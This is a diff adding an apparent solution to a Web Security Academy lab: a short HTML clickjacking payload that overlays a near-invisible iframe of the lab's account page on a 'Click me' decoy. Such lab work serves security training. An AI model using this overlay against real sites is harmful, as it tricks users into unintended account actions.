@@ -1,0 +1,18 @@
+# Basic clickjacking with CSRF token protection
+<style>
+   iframe {
+       position:relative; 
+       width: 500px;
+       height: 700px;
+       opacity: 0.0001;
+       z-index: 2; 
+   }    
+   div {
+       position:absolute;
+       top: 300px;
+       left: 60px;
+       z-index: 1;
+   }    
+</style>
+<div>Click me</div>
+<iframe src="https://acac1f491fb9666b809c307200fc0067.web-security-academy.net/account"></iframe>
